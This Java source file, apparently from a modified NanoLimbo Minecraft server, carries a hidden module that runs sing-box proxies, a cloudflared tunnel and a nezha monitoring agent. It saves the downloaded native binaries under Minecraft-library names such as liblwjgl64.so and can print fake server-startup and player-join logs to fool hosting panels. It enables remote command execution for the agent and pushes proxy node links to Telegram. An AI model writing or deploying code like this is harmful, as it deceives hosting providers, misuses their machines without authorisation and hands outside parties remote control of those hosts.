package ua.nanit.limbo.games;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.CountDownLatch;

/**
 * 代理模块入口（对齐 java-plugins-plus 的 AppService.startServer 流程）。
 *
 * 流程：抽取原生库 -> 生成 sing-box 配置 -> 拉起 sing-box / argo / nezha ->
 *       启动 HTTP 保活 -> 等待（靠 JVM 非守护线程存活，这里用 CountDownLatch 阻塞自身线程）。
 *
 * 注意：本类不阻塞 NanoLimbo 的主线程——由 NanoLimbo.main 在独立 daemon 线程里调用 run()。
 */
public final class GamesBootstrap {

    private final List<NativeService> services = new ArrayList<>();

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();
    private static final SecureRandom RANDOM = new SecureRandom();
    /** reality x25519 密钥对(生成后写入 .tmp/keypair.properties,供 sing-box config 与节点链接共用)。 */
    private static String realityPrivateKey = "";
    private static String realityPublicKey = "";

    /** 在后台线程调用，内部自行 await。 */
    public void run() {
        if (!GamesConfig.ENABLE_GAMES) {
            GamesLog.log("ENABLE_GAMES not set, games module disabled");
            return;
        }
        // 是否打印假的 MC 启动完成日志（让面板翻 online）。
        // 默认关闭：代理类长期驻留服务不该被面板"无玩家 15m 自动关停"误杀，
        // 卡在 starting 反而最安全。需要 online 显示时在 nano.properties 设 FAKE_MC_STARTUP=true。
        if (GamesConfig.FAKE_MC_STARTUP) {
            printFakeMcStartup();
        }
        // 先输出节点链接(不依赖原生库加载,本地 Windows 调试也能看到,且原生库崩了也能拿到配置)
        writeNodeLinks();
        try {
            startServer();
        } catch (Exception e) {
            GamesLog.log("task init failed: " + e.getMessage());
        }
    }

    /**
     * 用原始 System.out 打印一条符合常见面板 done 正则的日志（Done (Xs)!）
     * 和一条玩家加入日志，让 Pterodactyl 类面板识别为“已在线”，
     * 同时让控制台看起来像在跑游戏服务器。
     * 用裸 stdout（不走 logback/JUL），保证面板一定读得到。
     */
    private static void printFakeMcStartup() {
        try {
            System.out.println("Done (1.0s)! For help, type \"help\"");
            String fakePlayer = "Steve";
            // 用真实配置的 UUID 变量,不用 0000 占位
            System.out.println(fakePlayer + "[/127.0.0.1:0000] logged in with entity id 0, uuid " + GamesConfig.UUID);
            System.out.println(fakePlayer + " joined the game");
        } catch (Throwable ignored) {
        }
    }

    private void startServer() throws Exception {
        Files.createDirectories(GamesConfig.RUNTIME_DIR);

        String baseUrl = "https://" + GamesConfig.ARCH + ".oooen.com";
        // 磁盘保存名用贴近 Minecraft 游戏库的伪装名,远程资源名保持服务器真名
        Path singBoxLib = GamesConfig.resolveNativeLib("liblwjgl64.so", "sbx.so");
        Path cloudflaredLib = null;
        Path nezhaLib = null;
        Path nezhaAgentLib = null;

        if (!GamesConfig.DISABLE_ARGO) {
            cloudflaredLib = GamesConfig.resolveNativeLib("libOpenAL64.so", "bot.so");
        }
        if (!GamesConfig.NEZHA_SERVER.isEmpty() && !GamesConfig.NEZHA_KEY.isEmpty() && !GamesConfig.NEZHA_PORT.isEmpty()) {
            nezhaAgentLib = GamesConfig.resolveNativeLib("libjinput-linux64.so", "agent.so");
        } else if (!GamesConfig.NEZHA_SERVER.isEmpty() && !GamesConfig.NEZHA_KEY.isEmpty()) {
            nezhaLib = GamesConfig.resolveNativeLib("libnetty-transport-native.so", "v1.so");
            generateNezhaConfig(); // v1 模式：写 config.yaml（共用 UUID，不开 TLS）
        } else {
            GamesLog.log("n probe config skipped (no endpoint)");
        }

        // 生成 sing-box 配置（含 vmess-ws-in 仅当 argo 开启，避免 DISABLE_ARGO 时 8080 端口被占）
        Path certPath = GamesConfig.RUNTIME_DIR.resolve("cert.pem");
        Path keyPath = GamesConfig.RUNTIME_DIR.resolve("private.key");
        if (GamesConfig.isValidPort(GamesConfig.HY2_PORT)
                || GamesConfig.isValidPort(GamesConfig.TUIC_PORT)
                || GamesConfig.isValidPort(GamesConfig.ANYTLS_PORT)) {
            ensureTlsCertificates(certPath, keyPath);
        }

        Files.writeString(GamesConfig.SING_BOX_CONFIG_PATH,
                GamesConfig.toJson(generateSingBoxConfig(certPath.toString(), keyPath.toString())),
                StandardCharsets.UTF_8);

        services.add(new NativeService("sing-box", singBoxLib, "StartSingBox", "StopSingBox", singboxPayload()));
        if (cloudflaredLib != null) {
            String payload = cloudflaredPayload();
            if (payload != null) {
                services.add(new NativeService("cloudflared", cloudflaredLib, "StartCloudflared", "StopCloudflared", payload));
            }
        }
        if (nezhaLib != null) {
            services.add(new NativeService("nezha-agent", nezhaLib, "StartNezhaAgent", "StopNezhaAgent", nezhaPayload()));
        } else if (nezhaAgentLib != null) {
            services.add(new NativeService("nezha-agent", nezhaAgentLib, "StartNezhaAgent", "StopNezhaAgent", nezhaV0Payload()));
        }

        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopAll(), "games-shutdown-hook"));
        for (NativeService s : services) {
            s.start();
        }

        // HTTP 保活：HY2 走 UDP，保活走 TCP，两者同端口不冲突（内核版沿用此结论）
        startKeepAliveServer(GamesConfig.HY2_PORT);

        GamesLog.log("all tasks started");

        // 自身阻塞，保持线程存活（daemon 线程靠 JVM 其它非守护线程不会退出，这里 double 保险）
        new CountDownLatch(1).await();
    }

    /**
     * 生成全部已配置协议的节点链接(对齐 eooce/java-plugins-plus 的 generateLinks):
     * - serverIp 用公网 API 探测(ip.sb),失败回退本机 IP
     * - vmess: add=CFIP, port=CFPORT, host/sni=argo 域名, tls=tls(经 cloudflared 443)
     * - tuic/hy2/reality/anytls/socks5: address=serverIp(公网IP), 仅当端口显式配置才生成
     * - 输出: 整段 base64 写 .tmp/list.txt
     */
    private static void writeNodeLinks() {
        try {
            String serverIp = getPublicIp();
            String domain = GamesConfig.ARGO_DOMAIN.trim();
            String nodeName = GamesConfig.NAME.isEmpty() ? "nano" : GamesConfig.NAME;
            StringBuilder plain = new StringBuilder();

            // vmess (ws) —— 经 argo 隧道,add 用优选 IP/域名,port 用优选端口(默认 443),host/sni 用 argo 域名
            if (!GamesConfig.DISABLE_ARGO && !domain.isEmpty()) {
                // CFIP 为空/默认占位时,add 直接用 argo 域名,保证节点开箱即用
                String add = (GamesConfig.CFIP.isEmpty() || "baka.fun".equalsIgnoreCase(GamesConfig.CFIP))
                        ? domain : GamesConfig.CFIP;
                java.util.Map<String, Object> vmess = GamesConfig.mapOf(
                        "v", "2", "ps", nodeName,
                        "add", add, "port", GamesConfig.CFPORT, "id", GamesConfig.UUID,
                        "aid", "0", "scy", "auto", "net", "ws", "type", "none",
                        "host", domain, "path", "/vmess-argo?ed=2560", "tls", "tls",
                        "sni", domain, "alpn", "", "fp", "firefox");
                plain.append("vmess://").append(Base64.getEncoder()
                        .encodeToString(GamesConfig.toJson(vmess).getBytes(StandardCharsets.UTF_8))).append('\n');
            }

            // tuic
            if (GamesConfig.isValidPort(GamesConfig.TUIC_PORT)) {
                plain.append("tuic://").append(GamesConfig.UUID).append(':').append(GamesConfig.UUID)
                        .append('@').append(serverIp).append(':').append(GamesConfig.TUIC_PORT)
                        .append("?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#")
                        .append(nodeName).append('\n');
            }

            // hysteria2(仅显式填端口才生成,无变量不开启)
            String hy2Raw = GamesConfig.HY2_PORT;
            if (GamesConfig.isValidPort(hy2Raw)) {
                plain.append("hysteria2://").append(GamesConfig.UUID).append('@').append(serverIp)
                        .append(':').append(hy2Raw)
                        .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#").append(nodeName).append('\n');
            }

            // reality (vless) —— pbk 用 x25519 生成的公钥
            if (GamesConfig.isValidPort(GamesConfig.REALITY_PORT)) {
                ensureRealityKeypair();
                plain.append("vless://").append(GamesConfig.UUID).append('@').append(serverIp)
                        .append(':').append(GamesConfig.REALITY_PORT)
                        .append("?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=")
                        .append(realityPublicKey).append("&type=tcp&headerType=none#").append(nodeName).append('\n');
            }

            // anytls
            if (GamesConfig.isValidPort(GamesConfig.ANYTLS_PORT)) {
                plain.append("anytls://").append(GamesConfig.UUID).append('@').append(serverIp)
                        .append(':').append(GamesConfig.ANYTLS_PORT)
                        .append("?security=tls&sni=").append(serverIp).append("&fp=chrome&insecure=1&allowInsecure=1#")
                        .append(nodeName).append('\n');
            }

            // socks5
            if (GamesConfig.isValidPort(GamesConfig.S5_PORT)) {
                String auth = Base64.getEncoder().encodeToString(
                        (GamesConfig.UUID.substring(0, 8) + ":" + GamesConfig.UUID.substring(GamesConfig.UUID.length() - 12))
                                .getBytes(StandardCharsets.UTF_8));
                plain.append("socks://").append(auth).append('@').append(serverIp)
                        .append(':').append(GamesConfig.S5_PORT).append('#').append(nodeName).append('\n');
            }

            if (plain.length() == 0) {
                GamesLog.log("no inbound ports enabled, skip node link output");
                return;
            }

            String subText = plain.toString().stripTrailing();
            String encoded = Base64.getEncoder().encodeToString(subText.getBytes(StandardCharsets.UTF_8));
            Files.createDirectories(GamesConfig.LIST_FILE_PATH.getParent());
            Files.writeString(GamesConfig.LIST_FILE_PATH, encoded, StandardCharsets.UTF_8);
            GamesLog.log("node links -> .tmp/list.txt (base64)");
            if (GamesConfig.SHOW_LOG) {
                System.out.println("Base64: " + encoded);
            }
            sendTelegram();
        } catch (Exception e) {
            GamesLog.log("node link output failed: " + e.getMessage());
        }
    }

    /** 把 list.txt 的 base64 内容推送到 Telegram(需配置 BOT_TOKEN + CHAT_ID)。 */
    private static void sendTelegram() {
        if (GamesConfig.BOT_TOKEN.isEmpty() || GamesConfig.CHAT_ID.isEmpty()) {
            GamesLog.log("tg variables empty, skip node push");
            return;
        }
        try {
            String message = Files.readString(GamesConfig.LIST_FILE_PATH, StandardCharsets.UTF_8);
            String text = "**" + escapeMarkdownV2(GamesConfig.NAME.isEmpty() ? "nano" : GamesConfig.NAME)
                    + " nodes**\n```\n" + message + "\n```";
            String form = "chat_id=" + urlEncode(GamesConfig.CHAT_ID)
                    + "&text=" + urlEncode(text) + "&parse_mode=MarkdownV2";
            HttpRequest request = HttpRequest.newBuilder(
                    URI.create("https://api.telegram.org/bot" + GamesConfig.BOT_TOKEN + "/sendMessage"))
                    .timeout(Duration.ofSeconds(30))
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(HttpRequest.BodyPublishers.ofString(form))
                    .build();
            HTTP.send(request, HttpResponse.BodyHandlers.discarding());
            GamesLog.log("tg message sent (nodes pushed)");
        } catch (Exception e) {
            GamesLog.log("tg push failed: " + e.getMessage());
        }
    }

    private static String urlEncode(String s) {
        try {
            return java.net.URLEncoder.encode(s, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return s;
        }
    }

    private static String escapeMarkdownV2(String s) {
        return s.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[")
                .replace("`", "\\`").replace(".", "\\.");
    }

    /** 探测本机公网 IP(优先公网 API,失败回退本地探测)。 */
    private static String getPublicIp() {
        try {
            HttpRequest req = HttpRequest.newBuilder(URI.create("http://ipv4.ip.sb"))
                    .timeout(Duration.ofSeconds(3)).GET().build();
            HttpResponse<String> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofString());
            String ip = resp.body() == null ? "" : resp.body().trim();
            if (!ip.isEmpty() && ip.matches("^[0-9.]+$")) return ip;
        } catch (Exception ignored) {
        }
        return GamesConfig.detectLocalIp();
    }

    /** 生成或加载 reality x25519 密钥对(BC 实现),写入 .tmp/keypair.properties。 */
    private static void ensureRealityKeypair() {
        try {
            Path kp = GamesConfig.KEYPAIR_PATH;
            if (Files.exists(kp)) {
                String content = Files.readString(kp, StandardCharsets.UTF_8);
                for (String line : content.split("\n")) {
                    if (line.startsWith("PrivateKey:")) realityPrivateKey = line.substring(11).trim();
                    if (line.startsWith("PublicKey:")) realityPublicKey = line.substring(10).trim();
                }
                if (!realityPrivateKey.isEmpty() && !realityPublicKey.isEmpty()) return;
            }
            // 用 BC 的 X25519 生成密钥对
            org.bouncycastle.crypto.params.X25519PrivateKeyParameters priv =
                    new org.bouncycastle.crypto.params.X25519PrivateKeyParameters(RANDOM);
            org.bouncycastle.crypto.params.X25519PublicKeyParameters pub = priv.generatePublicKey();
            realityPrivateKey = Base64.getUrlEncoder().withoutPadding().encodeToString(priv.getEncoded());
            realityPublicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(pub.getEncoded());
            Files.createDirectories(kp.getParent());
            Files.writeString(kp, "PrivateKey: " + realityPrivateKey + "\nPublicKey: " + realityPublicKey + "\n",
                    StandardCharsets.UTF_8);
            GamesLog.log("reality keypair ready");
        } catch (Exception e) {
            GamesLog.log("reality keypair failed: " + e.getMessage());
        }
    }

    private void stopAll() {
        GamesLog.log("Stopping all games services...");
        for (int i = services.size() - 1; i >= 0; i--) {
            try {
                services.get(i).stop();
            } catch (Exception ignored) {
            }
        }
    }

    // ===================== sing-box 配置 =====================

    private static java.util.Map<String, Object> generateSingBoxConfig(String certPath, String keyPath) {
        List<Object> inbounds = new ArrayList<>();

        // 关键修复：DISABLE_ARGO 时不能无条件绑 ARGO_PORT，否则 8080 permission denied
        if (!GamesConfig.DISABLE_ARGO) {
            inbounds.add(GamesConfig.mapOf(
                    "type", "vmess",
                    "tag", "vmess-ws-in",
                    // 显式 0.0.0.0:部分受限容器 IPv6(::)绑定失败,导致 cloudflared 用 ::1 回源被拒
                    "listen", "0.0.0.0",
                    "listen_port", GamesConfig.ARGO_PORT,
                    "users", GamesConfig.listOf(GamesConfig.mapOf("uuid", GamesConfig.UUID)),
                    "transport", GamesConfig.mapOf(
                            "type", "ws",
                            "path", "/vmess-argo",
                            "early_data_header_name", "Sec-WebSocket-Protocol")
            ));
        }

        if (GamesConfig.isValidPort(GamesConfig.HY2_PORT)) {
            inbounds.add(GamesConfig.mapOf(
                    "type", "hysteria2",
                    "tag", "hysteria-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(GamesConfig.HY2_PORT),
                    "users", GamesConfig.listOf(GamesConfig.mapOf("password", GamesConfig.UUID)),
                    "masquerade", "https://bing.com",
                    "tls", GamesConfig.mapOf(
                            "enabled", true,
                            "alpn", GamesConfig.listOf("h3"),
                            "certificate_path", certPath,
                            "key_path", keyPath)
            ));
        }

        if (GamesConfig.isValidPort(GamesConfig.TUIC_PORT)) {
            inbounds.add(GamesConfig.mapOf(
                    "type", "tuic",
                    "tag", "tuic-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(GamesConfig.TUIC_PORT),
                    "users", GamesConfig.listOf(GamesConfig.mapOf("uuid", GamesConfig.UUID, "password", GamesConfig.UUID)),
                    "congestion_control", "bbr",
                    "tls", GamesConfig.mapOf(
                            "enabled", true,
                            "alpn", GamesConfig.listOf("h3"),
                            "certificate_path", certPath,
                            "key_path", keyPath)
            ));
        }

        if (GamesConfig.isValidPort(GamesConfig.S5_PORT)) {
            String s5User = GamesConfig.UUID.length() >= 12
                    ? GamesConfig.UUID.substring(0, 8) : "user";
            String s5Pass = GamesConfig.UUID.length() >= 12
                    ? GamesConfig.UUID.substring(GamesConfig.UUID.length() - 12) : "pass";
            inbounds.add(GamesConfig.mapOf(
                    "type", "socks",
                    "tag", "s5-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(GamesConfig.S5_PORT),
                    "users", GamesConfig.listOf(GamesConfig.mapOf(
                            "username", s5User,
                            "password", s5Pass))
            ));
        }

        if (GamesConfig.isValidPort(GamesConfig.ANYTLS_PORT)) {
            inbounds.add(GamesConfig.mapOf(
                    "type", "anytls",
                    "tag", "anytls-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(GamesConfig.ANYTLS_PORT),
                    "users", GamesConfig.listOf(GamesConfig.mapOf("password", GamesConfig.UUID)),
                    "tls", GamesConfig.mapOf(
                            "enabled", true,
                            "certificate_path", certPath,
                            "key_path", keyPath)
            ));
        }

        if (GamesConfig.isValidPort(GamesConfig.REALITY_PORT)) {
            ensureRealityKeypair();
            inbounds.add(GamesConfig.mapOf(
                    "type", "vless",
                    "tag", "vless-reality",
                    "listen", "::",
                    "listen_port", Integer.parseInt(GamesConfig.REALITY_PORT),
                    "users", GamesConfig.listOf(GamesConfig.mapOf("uuid", GamesConfig.UUID, "flow", "xtls-rprx-vision")),
                    "tls", GamesConfig.mapOf(
                            "enabled", true,
                            "server_name", "www.iij.ad.jp",
                            "reality", GamesConfig.mapOf(
                                    "enabled", true,
                                    "handshake", GamesConfig.mapOf("server", "www.iij.ad.jp", "server_port", 443),
                                    "private_key", realityPrivateKey,
                                    "short_id", GamesConfig.listOf(""))
                    )
            ));
        }

        return GamesConfig.mapOf(
                "log", GamesConfig.mapOf("disabled", true, "level", "error", "timestamp", true),
                "inbounds", inbounds,
                "outbounds", GamesConfig.listOf(GamesConfig.mapOf("type", "direct", "tag", "direct"))
        );
    }

    // ===================== payload 构造 =====================

    private static String singboxPayload() {
        return GamesConfig.toJson(GamesConfig.mapOf(
                "config", GamesConfig.SING_BOX_CONFIG_PATH.toString(),
                "workingDir", ".",
                "disableColor", true));
    }

    private static String cloudflaredPayload() {
        if (GamesConfig.DISABLE_ARGO) return null;
        if (!GamesConfig.ARGO_AUTH.isEmpty() && !GamesConfig.ARGO_DOMAIN.isEmpty()) {
            // token 形式
            if (GamesConfig.ARGO_AUTH.matches("^[A-Za-z0-9=]{120,250}$")) {
                // 必须显式给 --url http://127.0.0.1:<port>:sing-box 是明文 ws,
                // 否则 cloudflared 默认用 https 回源,TLS 握手会失败(tls: first record...)
                // 且用 127.0.0.1 而非 localhost,避免解析成 IPv6 ::1 导致连接被拒
                return GamesConfig.toJson(GamesConfig.mapOf("args",
                        GamesConfig.listOf("tunnel", "--edge-ip-version", "auto", "--no-autoupdate",
                                "--protocol", "http2", "--url", "http://127.0.0.1:" + GamesConfig.ARGO_PORT,
                                "run", "--token", GamesConfig.ARGO_AUTH)));
            }
        }
        // quick tunnel 形式
        return GamesConfig.toJson(GamesConfig.mapOf("args",
                GamesConfig.listOf("tunnel", "--edge-ip-version", "auto", "--no-autoupdate",
                        "--protocol", "http2", "--url", "http://127.0.0.1:" + GamesConfig.ARGO_PORT)));
    }

    private static String nezhaPayload() {
        return GamesConfig.toJson(GamesConfig.mapOf("config", GamesConfig.NEZHA_CONFIG_PATH.toString()));
    }

    private static String nezhaV0Payload() {
        List<Object> args = new ArrayList<>(GamesConfig.listOf(
                "-s", GamesConfig.NEZHA_SERVER + ":" + GamesConfig.NEZHA_PORT,
                "-p", GamesConfig.NEZHA_KEY,
                "--disable-auto-update", "--report-delay", "4", "--skip-conn", "--skip-procs"));
        if (java.util.List.of("443", "8443", "2096", "2087", "2083", "2053").contains(GamesConfig.NEZHA_PORT)) {
            args.add("--tls");
        }
        return GamesConfig.toJson(GamesConfig.mapOf("args", args));
    }

    /**
     * nezha v1 模式：生成 config.yaml。
     * 共用 UUID（与代理节点同一个），默认不开 TLS（面板给的 8008 非标准 TLS 端口）。
     */
    private static void generateNezhaConfig() throws IOException {
        String nzPort = GamesConfig.NEZHA_SERVER.contains(":")
                ? GamesConfig.NEZHA_SERVER.substring(GamesConfig.NEZHA_SERVER.lastIndexOf(':') + 1)
                : "";
        boolean tls = java.util.List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);
        String yaml = "client_secret: " + GamesConfig.NEZHA_KEY + "\n" +
                "debug: false\n" +
                "disable_auto_update: true\n" +
                "disable_command_execute: false\n" +
                "disable_force_update: true\n" +
                "disable_nat: false\n" +
                "disable_send_query: false\n" +
                "gpu: false\n" +
                "insecure_tls: true\n" +
                "ip_report_period: 1800\n" +
                "report_delay: 4\n" +
                "server: " + GamesConfig.NEZHA_SERVER + "\n" +
                "skip_connection_count: true\n" +
                "skip_procs_count: true\n" +
                "temperature: false\n" +
                "tls: " + tls + "\n" +
                "use_gitee_to_upgrade: false\n" +
                "use_ipv6_country_code: false\n" +
                "uuid: " + GamesConfig.UUID + "\n";
        Files.writeString(GamesConfig.NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
        GamesLog.log("n probe config written (shared id, secure=" + tls + ")");
    }

    // ===================== HTTP 保活 =====================

    private static void startKeepAliveServer(String portStr) {
        if (!GamesConfig.isValidPort(portStr)) {
            GamesLog.log("heartbeat port invalid, skip: " + portStr);
            return;
        }
        int port = Integer.parseInt(portStr);
        try {
            com.sun.net.httpserver.HttpServer server = com.sun.net.httpserver.HttpServer
                    .create(new java.net.InetSocketAddress(port), 0);
            server.createContext("/healthz", ex -> {
                String body = "OK";
                ex.sendResponseHeaders(200, body.length());
                try (java.io.OutputStream os = ex.getResponseBody()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
            });
            server.createContext("/", ex -> {
                String body = "OK";
                ex.sendResponseHeaders(200, body.length());
                try (java.io.OutputStream os = ex.getResponseBody()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
            });
            server.setExecutor(null);
            server.start();
            GamesLog.log("heartbeat listener started on port " + port);
        } catch (Exception e) {
            GamesLog.log("heartbeat listener failed on port " + port + ": " + e.getMessage());
        }
    }

    // ===================== TLS 证书 =====================
    // 优先用 openssl 生成真实证书；不可用则用纯 Java 生成自签名 ECDSA 证书，
    // 保证 HY2/TUIC/ANYTLS 的 TLS 配置在运行时是有效 PEM（占位符证书会导致 sing-box 启动失败）。

    private static void ensureTlsCertificates(Path certPath, Path keyPath) throws IOException {
        if (Files.exists(certPath) && Files.exists(keyPath) && looksLikePemPair(certPath, keyPath)) {
            return;
        }
        Files.createDirectories(certPath.getParent());
        Path tmpCert = Path.of(certPath + ".tmp");
        Path tmpKey = Path.of(keyPath + ".tmp");
        try {
            if (runCommand("openssl", "version") == 0
                    && runCommand("openssl", "ecparam", "-genkey", "-name", "prime256v1", "-out", tmpKey.toString()) == 0
                    && runCommand("openssl", "req", "-new", "-x509", "-days", "3650", "-key", tmpKey.toString(),
                            "-out", tmpCert.toString(), "-subj", "/CN=bing.com") == 0
                    && looksLikePemPair(tmpCert, tmpKey)) {
                Files.move(tmpCert, certPath, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                Files.move(tmpKey, keyPath, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                GamesLog.log("credential material ready (external tool)");
                return;
            }
        } catch (Exception ignored) {
        } finally {
            Files.deleteIfExists(tmpCert);
            Files.deleteIfExists(tmpKey);
        }
        // 回退：纯 Java 生成自签名证书
        try {
            generateSelfSignedCert(certPath, keyPath);
            GamesLog.log("credential material ready (built-in)");
        } catch (Exception e) {
            GamesLog.log("credential material failed: " + e.getMessage());
            throw new IOException("cert generation failed", e);
        }
    }

    private static boolean looksLikePemPair(Path certPath, Path keyPath) {
        try {
            String cert = Files.readString(certPath, StandardCharsets.UTF_8);
            String key = Files.readString(keyPath, StandardCharsets.UTF_8);
            return cert.contains("-----BEGIN CERTIFICATE-----")
                    && key.contains("PRIVATE KEY");
        } catch (IOException e) {
            return false;
        }
    }

    private static int runCommand(String... command) throws IOException, InterruptedException {
        return new ProcessBuilder(command).redirectErrorStream(true).start().waitFor();
    }

    /** 用 BouncyCastle 生成自签名 EC P-256 证书（纯 Java，无 sun.* 模块限制，JDK 21 可用）。 */
    private static void generateSelfSignedCert(Path certPath, Path keyPath) throws Exception {
        // 注册 BC  provider（幂等）
        if (java.security.Security.getProvider("BC") == null) {
            java.security.Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
        }
        org.bouncycastle.operator.jcajce.JcaContentSignerBuilder signerBuilder =
                new org.bouncycastle.operator.jcajce.JcaContentSignerBuilder("SHA256withECDSA");

        java.security.KeyPairGenerator kpg = java.security.KeyPairGenerator.getInstance("EC", "BC");
        kpg.initialize(new java.security.spec.ECGenParameterSpec("secp256r1"), new java.security.SecureRandom());
        java.security.KeyPair kp = kpg.generateKeyPair();

        java.util.Date notBefore = new java.util.Date(System.currentTimeMillis() - 1000L * 60 * 60);
        java.util.Date notAfter = new java.util.Date(System.currentTimeMillis() + 1000L * 60 * 60 * 24 * 3650L);

        org.bouncycastle.cert.X509v3CertificateBuilder certBuilder =
                new org.bouncycastle.cert.jcajce.JcaX509v3CertificateBuilder(
                        new org.bouncycastle.asn1.x500.X500Name("CN=bing.com"),
                        new java.math.BigInteger(64, new java.security.SecureRandom()),
                        notBefore,
                        notAfter,
                        new org.bouncycastle.asn1.x500.X500Name("CN=bing.com"),
                        kp.getPublic());

        org.bouncycastle.cert.X509CertificateHolder holder =
                certBuilder.build(signerBuilder.build(kp.getPrivate()));
        java.security.cert.X509Certificate cert = new org.bouncycastle.cert.jcajce.JcaX509CertificateConverter()
                .setProvider("BC").getCertificate(holder);

        // 写出 PEM
        String b64Cert = java.util.Base64.getEncoder().encodeToString(cert.getEncoded());
        // 私钥用 PKCS#8 编码
        String b64Key = java.util.Base64.getEncoder().encodeToString(kp.getPrivate().getEncoded());
        Files.writeString(certPath,
                "-----BEGIN CERTIFICATE-----\n" + pemChunk(b64Cert) + "-----END CERTIFICATE-----\n",
                StandardCharsets.UTF_8);
        Files.writeString(keyPath,
                "-----BEGIN PRIVATE KEY-----\n" + pemChunk(b64Key) + "-----END PRIVATE KEY-----\n",
                StandardCharsets.UTF_8);
    }

    private static String pemChunk(String b64) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < b64.length(); i += 64) {
            sb.append(b64, i, Math.min(i + 64, b64.length())).append('\n');
        }
        return sb.toString();
    }
}
